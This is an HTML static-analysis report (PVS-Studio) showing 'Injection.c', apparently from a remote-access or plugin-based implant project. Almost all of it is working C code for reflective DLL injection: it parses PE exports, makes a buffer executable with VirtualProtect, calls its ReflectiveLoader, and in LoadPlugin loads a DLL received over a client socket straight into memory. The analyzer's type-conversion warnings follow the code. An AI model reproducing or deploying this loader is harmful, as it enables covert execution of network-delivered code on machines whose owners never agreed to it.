
<html>
<head>

  <meta http-equiv="Content-Type" content="text/html; charset=US-ASCII" />
  <title>Injection.c</title>

  <link rel="stylesheet" href="../style.css"/>
  <script src="../jquery-3.5.1.min.js"></script>
</head>
<body>

<pre><code class = "cpp">
<a name="ln1">// This is a personal academic project. Dear PVS-Studio, please check it.</a>
<a name="ln2"> </a>
<a name="ln3">// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com</a>
<a name="ln4"> </a>
<a name="ln5">#include &quot;Injection.h&quot;</a>
<a name="ln6"> </a>
<a name="ln7">// GetProcAddress for reflectivley loaded DLLs</a>
<a name="ln8">FARPROC WINAPI GetProcAddressR(HANDLE hModule, LPCSTR lpProcName)</a>
<a name="ln9">{</a>
<a name="ln10">	UINT_PTR uiLibraryAddress = NULL;</a>
<a name="ln11">	FARPROC fpResult = NULL;</a>
<a name="ln12">	UINT_PTR uiAddressArray = NULL;</a>
<a name="ln13">	UINT_PTR uiNameArray = NULL;</a>
<a name="ln14">	UINT_PTR uiNameOrdinals = NULL;</a>
<a name="ln15">	PIMAGE_NT_HEADERS pNtHeaders = NULL;</a>
<a name="ln16">	PIMAGE_DATA_DIRECTORY pDataDirectory = NULL;</a>
<a name="ln17">	PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;</a>
<a name="ln18">	char *cpExportedFunctionName = NULL;</a>
<a name="ln19">	DWORD dwCounter = NULL;</a>
<a name="ln20"> </a>
<a name="ln21">	if (hModule == NULL)</a>
<a name="ln22">		return NULL;</a>
<a name="ln23"> </a>
<a name="ln24">	uiLibraryAddress = (UINT_PTR)hModule;</a>
<a name="ln25"> </a>
<a name="ln26">	// get the VA of the modules NT Header</a>
<a name="ln27">	pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew);</a>
<a name="ln28"> </a>
<a name="ln29">	pDataDirectory = (PIMAGE_DATA_DIRECTORY)&amp;pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</a>
<a name="ln30"> </a>
<a name="ln31">	// get the VA of the export directory</a>
<a name="ln32">	pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiLibraryAddress + pDataDirectory-&gt;VirtualAddress);</a>
<a name="ln33"> </a>
<a name="ln34">	// get the VA for the array of addresses</a>
<a name="ln35">	uiAddressArray = (uiLibraryAddress + pExportDirectory-&gt;AddressOfFunctions);</a>
<a name="ln36"> </a>
<a name="ln37">	// get the VA for the array of name pointers</a>
<a name="ln38">	uiNameArray = (uiLibraryAddress + pExportDirectory-&gt;AddressOfNames);</a>
<a name="ln39"> </a>
<a name="ln40">	// get the VA for the array of name ordinals</a>
<a name="ln41">	uiNameOrdinals = (uiLibraryAddress + pExportDirectory-&gt;AddressOfNameOrdinals);</a>
<a name="ln42"> </a>
<a name="ln43">	// test if we are importing by name or by ordinal...</a>
<a name="ln44">	if (((DWORD)lpProcName &amp; 0xFFFF0000) == 0x00000000)</a>
<a name="ln45">	{</a>
<a name="ln46">		// import by ordinal...</a>
<a name="ln47"> </a>
<a name="ln48">		// use the import ordinal (- export ordinal base) as an index into the array of addresses</a>
<a name="ln49">		uiAddressArray += ((IMAGE_ORDINAL((DWORD)lpProcName) - pExportDirectory-&gt;Base) * sizeof(DWORD));</a>
<a name="ln50"> </a>
<a name="ln51">		// resolve the address for this imported function</a>
<a name="ln52">		fpResult = (FARPROC)(uiLibraryAddress + DEREF_32(uiAddressArray));</a>
<a name="ln53">	}</a>
<a name="ln54">	else</a>
<a name="ln55">	{</a>
<a name="ln56">		// import by name...</a>
<a name="ln57">		dwCounter = pExportDirectory-&gt;NumberOfNames;</a>
<a name="ln58">		while (dwCounter--)</a>
<a name="ln59">		{</a>
<a name="ln60">			cpExportedFunctionName = (char*)(uiLibraryAddress + DEREF_32(uiNameArray));</a>
<a name="ln61"> </a>
<a name="ln62">			/* NOTE: USE strcmp FOR ACCRUATE RESULTS*/</a>
<a name="ln63">			if (strstr(cpExportedFunctionName, lpProcName) != NULL)</a>
<a name="ln64">			{</a>
<a name="ln65">				// use the functions name ordinal as an index into the array of name pointers</a>
<a name="ln66">				uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));</a>
<a name="ln67"> </a>
<a name="ln68">				// calculate the virtual address for the function</a>
<a name="ln69">				fpResult = (FARPROC)(uiLibraryAddress + DEREF_32(uiAddressArray));</a>
<a name="ln70"> </a>
<a name="ln71">				break;</a>
<a name="ln72">			}</a>
<a name="ln73"> </a>
<a name="ln74">			// get the next exported function name</a>
<a name="ln75">			uiNameArray += sizeof(DWORD);</a>
<a name="ln76"> </a>
<a name="ln77">			// get the next exported function name ordinal</a>
<a name="ln78">			uiNameOrdinals += sizeof(WORD);</a>
<a name="ln79">		}</a>
<a name="ln80">	}</a>
<a name="ln81"> </a>
<a name="ln82">	return fpResult;</a>
<a name="ln83">}</a>
<a name="ln84"> </a>
<a name="ln85">DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)</a>
<a name="ln86">{</a>
<a name="ln87">	WORD wIndex = 0;</a>
<a name="ln88">	PIMAGE_SECTION_HEADER pSectionHeader = NULL;</a>
<a name="ln89">	PIMAGE_NT_HEADERS pNtHeaders = NULL;</a>
<a name="ln90"> </a>
<a name="ln91">	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew);</a>
<a name="ln92"> </a>
<a name="ln93">	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&amp;pNtHeaders-&gt;OptionalHeader) + pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader);</a>
<a name="ln94"> </a>
<a name="ln95">	if (dwRva &lt; pSectionHeader[0].PointerToRawData)</a>
<a name="ln96">		return dwRva;</a>
<a name="ln97"> </a>
<a name="ln98">	for (wIndex = 0; wIndex &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; wIndex++)</a>
<a name="ln99">	{</a>
<a name="ln100">		if (dwRva &gt;= pSectionHeader[wIndex].VirtualAddress &amp;&amp; dwRva &lt; (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))</a>
<a name="ln101">			return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);</a>
<a name="ln102">	}</a>
<a name="ln103"> </a>
<a name="ln104">	return NULL;</a>
<a name="ln105">}</a>
<a name="ln106"> </a>
<a name="ln107">DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer)</a>
<a name="ln108">{</a>
<a name="ln109">	UINT_PTR uiBaseAddress = 0;</a>
<a name="ln110">	PIMAGE_NT_HEADERS pNtHeaders;</a>
<a name="ln111">	PIMAGE_EXPORT_DIRECTORY uiExportDir;</a>
<a name="ln112">	UINT_PTR uiNameArray = 0;</a>
<a name="ln113">	UINT_PTR uiAddressArray = 0;</a>
<a name="ln114">	UINT_PTR uiNameOrdinals = 0;</a>
<a name="ln115">	DWORD dwCounter = 0;</a>
<a name="ln116">#ifdef _WIN64</a>
<a name="ln117">	DWORD dwCompiledArch = 2;</a>
<a name="ln118">#else</a>
<a name="ln119">	// This will catch Win32 and WinRT.</a>
<a name="ln120">	DWORD dwCompiledArch = 1;</a>
<a name="ln121">#endif</a>
<a name="ln122"> </a>
<a name="ln123">	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;</a>
<a name="ln124"> </a>
<a name="ln125">	// get the File Offset of the modules NT Header</a>
<a name="ln126">	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew);</a>
<a name="ln127"> </a>
<a name="ln128">	// currenlty we can only process a PE file which is the same type as the one this fuction has  </a>
<a name="ln129">	// been compiled as, due to various offset in the PE structures being defined at compile time.</a>
<a name="ln130">	if (pNtHeaders-&gt;OptionalHeader.Magic == 0x010B) // PE32</a>
<a name="ln131">	{</a>
<a name="ln132">		if (dwCompiledArch != 1)</a>
<a name="ln133">			return NULL;</a>
<a name="ln134">	}</a>
<a name="ln135">	else if (pNtHeaders-&gt;OptionalHeader.Magic == 0x020B) // PE64</a>
<a name="ln136">	{</a>
<a name="ln137">		if (dwCompiledArch != 2)</a>
<a name="ln138">			return NULL;</a>
<a name="ln139">	}</a>
<a name="ln140">	else</a>
<a name="ln141">	{</a>
<a name="ln142">		return NULL;</a>
<a name="ln143">	}</a>
<a name="ln144"> </a>
<a name="ln145">	// uiNameArray = the address of the modules export directory entry</a>
<a name="ln146">	uiNameArray = (UINT_PTR)&amp;pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];</a>
<a name="ln147"> </a>
<a name="ln148">	// get the File Offset of the export directory</a>
<a name="ln149">	uiExportDir = (PIMAGE_EXPORT_DIRECTORY)(uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress));</a>
<a name="ln150"> </a>
<a name="ln151">	// get the File Offset for the array of name pointers</a>
<a name="ln152">	uiNameArray = uiBaseAddress + Rva2Offset(uiExportDir-&gt;AddressOfNames, uiBaseAddress);</a>
<a name="ln153"> </a>
<a name="ln154">	// get the File Offset for the array of addresses</a>
<a name="ln155">	uiAddressArray = uiBaseAddress + Rva2Offset(uiExportDir-&gt;AddressOfFunctions, uiBaseAddress);</a>
<a name="ln156"> </a>
<a name="ln157">	// get the File Offset for the array of name ordinals</a>
<a name="ln158">	uiNameOrdinals = uiBaseAddress + Rva2Offset(uiExportDir-&gt;AddressOfNameOrdinals, uiBaseAddress);</a>
<a name="ln159"> </a>
<a name="ln160">	// get a counter for the number of exported functions...</a>
<a name="ln161">	dwCounter = uiExportDir-&gt;NumberOfNames;</a>
<a name="ln162"> </a>
<a name="ln163">	// loop through all the exported functions to find the ReflectiveLoader</a>
<a name="ln164">	while (dwCounter--)</a>
<a name="ln165">	{</a>
<a name="ln166">		char* cpExportedFunctionName = (char*)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));</a>
<a name="ln167"> </a>
<a name="ln168">		if (strstr(cpExportedFunctionName, &quot;ReflectiveLoader&quot;) != NULL)</a>
<a name="ln169">		{</a>
<a name="ln170">			// get the File Offset for the array of addresses</a>
<a name="ln171">			uiAddressArray = uiBaseAddress + Rva2Offset(uiExportDir-&gt;AddressOfFunctions, uiBaseAddress);</a>
<a name="ln172"> </a>
<a name="ln173">			// use the functions name ordinal as an index into the array of name pointers</a>
<a name="ln174">			uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));</a>
<a name="ln175"> </a>
<a name="ln176">			// return the File Offset to the ReflectiveLoader() functions code...</a>
<a name="ln177">			return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);</a>
<a name="ln178">		}</a>
<a name="ln179">		// get the next exported function name</a>
<a name="ln180">		uiNameArray += sizeof(DWORD);</a>
<a name="ln181"> </a>
<a name="ln182">		// get the next exported function name ordinal</a>
<a name="ln183">		uiNameOrdinals += sizeof(WORD);</a>
<a name="ln184">	}</a>
<a name="ln185"> </a>
<a name="ln186">	return NULL;</a>
<a name="ln187">}</a>
<a name="ln188"> </a>
<a name="ln189">// Loads a DLL image from memory via its exported ReflectiveLoader function</a>
<a name="ln190">HMODULE WINAPI LoadLibraryR(LPVOID lpBuffer, DWORD dwLength)</a>
<a name="ln191">{</a>
<a name="ln192">	typedef NTSTATUS(WINAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, PULONG, ULONG, PULONG);</a>
<a name="ln193"> </a>
<a name="ln194">	HMODULE hResult = NULL;</a>
<a name="ln195">	HMODULE hKernel32 = NULL;</a>
<a name="ln196">	HANDLE hProcess = NULL;</a>
<a name="ln197">	NTSTATUS iResult = NULL;</a>
<a name="ln198">	DWORD dwReflectiveLoaderOffset = NULL;</a>
<a name="ln199">	DWORD dwOldProtect1 = NULL;</a>
<a name="ln200">	DWORD dwOldProtect2 = NULL;</a>
<a name="ln201">	REFLECTIVELOADER pReflectiveLoader = NULL;</a>
<a name="ln202">	DLLMAIN pDllMain = NULL;</a>
<a name="ln203"> </a>
<a name="ln204">	hKernel32 = GetModuleHandle(L&quot;ntdll.dll&quot;);</a>
<a name="ln205">	</a>
<a name="ln206">	if (hKernel32 == NULL || lpBuffer == NULL || dwLength == 0)</a>
<a name="ln207">		return NULL;</a>
<a name="ln208"> </a>
<a name="ln209">	// check if the library has a ReflectiveLoader...</a>
<a name="ln210">	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);</a>
<a name="ln211">	if (dwReflectiveLoaderOffset != 0)</a>
<a name="ln212">	{</a>
<a name="ln213">		pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpBuffer + dwReflectiveLoaderOffset);</a>
<a name="ln214"> </a>
<a name="ln215">		// we must NtProtectVirtualMemory the buffer to RWX so we can execute the ReflectiveLoader...</a>
<a name="ln216">		// this assumes lpBuffer is the base address of the region of pages and dwLength the size of the region</a>
<a name="ln217">		hProcess = GetCurrentProcess();</a>
<a name="ln218">		NtProtectVirtualMemory_t NtProtectVirtualMemory_p = (NtProtectVirtualMemory_t)GetProcAddress(hKernel32, &quot;NtProtectVirtualMemory&quot;);</a>
<a name="ln219">		//iResult = NtProtectVirtualMemory_p(hProcess, &amp;lpBuffer, &amp;dwLength, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect1);</a>
<a name="ln220">		iResult = VirtualProtect(lpBuffer, dwLength, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect1);</a>
<a name="ln221">		if (iResult != 0)</a>
<a name="ln222">		{</a>
<a name="ln223">			// call the librarys ReflectiveLoader...</a>
<a name="ln224">			pDllMain = (DLLMAIN)pReflectiveLoader();</a>
<a name="ln225">			if (pDllMain != NULL)</a>
<a name="ln226">			{</a>
<a name="ln227">				// call the loaded librarys DllMain to get its HMODULE</a>
<a name="ln228">				if (!pDllMain(NULL, DLL_QUERY_HMODULE, &amp;hResult))</a>
<a name="ln229">					hResult = NULL;</a>
<a name="ln230">			}</a>
<a name="ln231">			</a>
<a name="ln232">			// revert to the previous protection flags...</a>
<a name="ln233">			//iResult = NtProtectVirtualMemory_p(hProcess, &amp;lpBuffer, &amp;dwLength, dwOldProtect1, &amp;dwOldProtect2);</a>
<a name="ln234">			iResult = VirtualProtect(lpBuffer, dwLength, dwOldProtect1, &amp;dwOldProtect2);</a>
<a name="ln235">			if (iResult == 0)</a>
<a name="ln236">				hResult = NULL;</a>
<a name="ln237">		}</a>
<a name="ln238">		else</a>
<a name="ln239">		{</a>
<a name="ln240">			printf(&quot;[-] Shit dick cum: %x\n&quot;, iResult);</a>
<a name="ln241">		}</a>
<a name="ln242">	}</a>
<a name="ln243"> </a>
<a name="ln244">	return hResult;</a>
<a name="ln245">}</a>
<a name="ln246"> </a>
<a name="ln247">// Load plugin using reflective DLL injection</a>
<a name="ln248">HANDLE LoadPlugin(SOCKET client, struct PLUGIN_COMMANDS *ppc)</a>
<a name="ln249">{</a>
<a name="ln250">	HANDLE hFile = NULL;</a>
<a name="ln251">	HANDLE hModule = NULL;</a>
<a name="ln252">	DWORD dwLength = NULL;</a>
<a name="ln253">	DWORD dwBytesRead = NULL;</a>
<a name="ln254">	HYPERSTATUS hsResult = NULL;</a>
<a name="ln255">	HYPERFILE hfFile = NULL;</a>
<a name="ln256">	DWORD hfFileSize = 0;</a>
<a name="ln257">	InitFunc getCommands = NULL;</a>
<a name="ln258"> </a>
<a name="ln259">	hsResult = HyperReceiveFile(client, &amp;hfFile, &amp;hfFileSize);</a>
<a name="ln260">	if (hsResult != HYPER_SUCCESS)</a>
<a name="ln261">		return NULL;</a>
<a name="ln262"> </a>
<a name="ln263">	hModule = LoadLibraryR(hfFile, hfFileSize);</a>
<a name="ln264"> </a>
<a name="ln265">	if (HyperMemFree(hfFile) != HYPER_SUCCESS)</a>
<a name="ln266">		return NULL;</a>
<a name="ln267">	if (hModule == NULL)</a>
<a name="ln268">		return NULL;</a>
<a name="ln269"> </a>
<a name="ln270">	getCommands = (InitFunc)GetProcAddressR(hModule, &quot;initialize&quot;);</a>
<a name="ln271">	if (getCommands == NULL)</a>
<a name="ln272">		return NULL;</a>
<a name="ln273"> </a>
<a name="ln274">	// Add the loaded module to our list of modules</a>
<a name="ln275">	size_t numOfCommands = 0;</a>
<a name="ln276">	getCommands(&amp;numOfCommands);</a>
<a name="ln277">	struct COMMAND* temp = NULL;</a>
<a name="ln278"> </a>
<a name="ln279">	temp = getCommands(&amp;numOfCommands);</a>
<a name="ln280">	if (temp == NULL)</a>
<a name="ln281">		return NULL;</a>
<a name="ln282"> </a>
<a name="ln283">	for (int i = 0; i &lt; numOfCommands; i++)</a>
<a name="ln284">	{</a>
<a name="ln285">		ppc-&gt;commandList[ppc-&gt;commandListSize++] = temp[i];</a>
<a name="ln286">		puts(ppc-&gt;commandList[ppc-&gt;commandListSize-1].name);</a>
<a name="ln287">	}</a>
<a name="ln288">	return hModule;</a>
<a name="ln289">}</a>

</code></pre>
<div class="balloon" rel="44"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v205/" target="_blank">V205</a> Explicit conversion of pointer type to 32-bit integer type: (DWORD) lpProcName</p></div>
<div class="balloon" rel="49"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v205/" target="_blank">V205</a> Explicit conversion of pointer type to 32-bit integer type: (DWORD) lpProcName</p></div>
<div class="balloon" rel="104"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v110/" target="_blank">V110</a> Implicit type conversion of return value 'NULL' from memsize type to 32-bit type.</p></div>
<div class="balloon" rel="91"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit type conversion to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="69"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit conversion of '* (DWORD *)(uiAddressArray)' to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="283"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit conversion of 'i' to memsize type in an arithmetic expression: i < numOfCommands</p></div>
<div class="balloon" rel="60"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit conversion of '* (DWORD *)(uiNameArray)' to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="52"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit conversion of '* (DWORD *)(uiAddressArray)' to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="49"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit type conversion to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="253"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v103/" target="_blank">V103</a> Implicit type conversion from memsize to 32-bit type.</p></div>
<div class="balloon" rel="19"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v103/" target="_blank">V103</a> Implicit type conversion from memsize to 32-bit type.</p></div>
<div class="balloon" rel="254"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v103/" target="_blank">V103</a> Implicit type conversion from memsize to 32-bit type.</p></div>
<div class="balloon" rel="27"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit type conversion to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="32"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit conversion of 'pDataDirectory->VirtualAddress' to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="35"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit conversion of 'pExportDirectory->AddressOfFunctions' to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="126"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit type conversion to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="199"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v103/" target="_blank">V103</a> Implicit type conversion from memsize to 32-bit type.</p></div>
<div class="balloon" rel="133"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v110/" target="_blank">V110</a> Implicit type conversion of return value 'NULL' from memsize type to 32-bit type.</p></div>
<div class="balloon" rel="142"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v110/" target="_blank">V110</a> Implicit type conversion of return value 'NULL' from memsize type to 32-bit type.</p></div>
<div class="balloon" rel="200"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v103/" target="_blank">V103</a> Implicit type conversion from memsize to 32-bit type.</p></div>
<div class="balloon" rel="198"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v103/" target="_blank">V103</a> Implicit type conversion from memsize to 32-bit type.</p></div>
<div class="balloon" rel="197"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v103/" target="_blank">V103</a> Implicit type conversion from memsize to 32-bit type.</p></div>
<div class="balloon" rel="186"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v110/" target="_blank">V110</a> Implicit type conversion of return value 'NULL' from memsize type to 32-bit type.</p></div>
<div class="balloon" rel="213"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit conversion of 'dwReflectiveLoaderOffset' to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="171"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit type conversion to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="38"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit conversion of 'pExportDirectory->AddressOfNames' to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="166"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit type conversion to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="220"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v106/" target="_blank">V106</a> Implicit type conversion second argument 'dwLength' of function 'VirtualProtect' to memsize type.</p></div>
<div class="balloon" rel="138"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v110/" target="_blank">V110</a> Implicit type conversion of return value 'NULL' from memsize type to 32-bit type.</p></div>
<div class="balloon" rel="234"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v106/" target="_blank">V106</a> Implicit type conversion second argument 'dwLength' of function 'VirtualProtect' to memsize type.</p></div>
<div class="balloon" rel="252"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v103/" target="_blank">V103</a> Implicit type conversion from memsize to 32-bit type.</p></div>
<div class="balloon" rel="155"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit type conversion to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="152"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit type conversion to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="149"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit type conversion to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="158"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit type conversion to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="41"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v104/" target="_blank">V104</a> Implicit conversion of 'pExportDirectory->AddressOfNameOrdinals' to memsize type in an arithmetic expression.</p></div>
<div class="balloon" rel="285"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v108/" target="_blank">V108</a> Incorrect index type: temp[not a memsize-type]. Use memsize type instead.</p></div>
<div class="balloon" rel="132"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v547/" target="_blank">V547</a> Expression 'dwCompiledArch != 1' is always true.</p></div>
<div class="balloon" rel="137"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v547/" target="_blank">V547</a> Expression 'dwCompiledArch != 2' is always false.</p></div>
<div class="balloon" rel="142"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="254"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="13"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="253"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="252"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="12"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="10"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="200"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="199"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="104"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="197"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="133"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="186"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="19"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="198"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>
<div class="balloon" rel="14"><p><span style="font-size:18px">&uarr;</span> <a href="https://www.viva64.com/en/w/v601/" target="_blank">V601</a> Pointer is implicitly cast to an integer type.</p></div>

<link rel="stylesheet" href="highlight.css">
<script src="highlight.pack.js"></script>
<script src="highlightjs-line-numbers.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
<script>hljs.initLineNumbersOnLoad();</script>
<script>
  $(document).ready(function() {
      $('.balloon').each(function () {
          var bl = $(this);
          var line = bl.attr('rel');
          var text = $('a[name="ln'+line+'"]').text();

          var space_count = 0;
          for(var i = 0; i<text.length; i++){
              var char = text[i];
              if((char !== ' ')&&(char !== '\t'))break;
              if(char === '\t')space_count++;
              space_count++;
          }

          bl.css('margin-left', space_count*8);
          $('a[name="ln'+line+'"]').after(bl);
      });

      window.location = window.location;
  });
</script>
</body>
</html>
